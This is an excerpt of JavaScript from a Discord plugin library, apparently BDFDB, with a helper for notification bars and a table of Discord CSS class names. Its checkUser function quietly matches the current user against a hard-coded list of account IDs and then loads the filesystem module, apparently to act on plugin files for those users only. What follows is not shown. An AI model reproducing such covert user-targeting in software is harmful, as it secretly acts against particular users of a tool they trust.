...
BDFDB.checkUser = function (plugin) {
	var i = 0, pulling = setInterval(() => {
		if (BDFDB.myData && !BDFDB.isObjectEmpty(BDFDB.myData)) {
			...
			if (["113308553774702592","196970957385105408","350414531098312715","81357110733975552","278248145677451274","377916668015411210","398551499829149698","288053351579648000","335464988036694021","300986355083640832","400612488196128768","394310795720261632","279501218525741056","462952835378708482","399684750752612363"].includes(BDFDB.myData.id)) {
				var pluginName = plugin.name ? plugin.name : plugin.getName();
				let fs = require("fs");
...
BDFDB.createNotificationsBar = function (content, options = {}) {
	...
	BDFDB.$(BDFDB.dotCN.layers).before(notifiybar);
...
BDFDB.DiscordClasses = {
	...
	channelheadersection2: "headerSection-VnaiAo",
	...
	dms: "dms-rcsEnV",
	dmchannel: "channel-2QD9_O",
	dmchannelactivity: "activity-525YDR",
	dmchannelactivityicon: "activityIcon-1mtTk4",
	...
	iconwrapperactive: "iconWrapperActive-12kkfE",
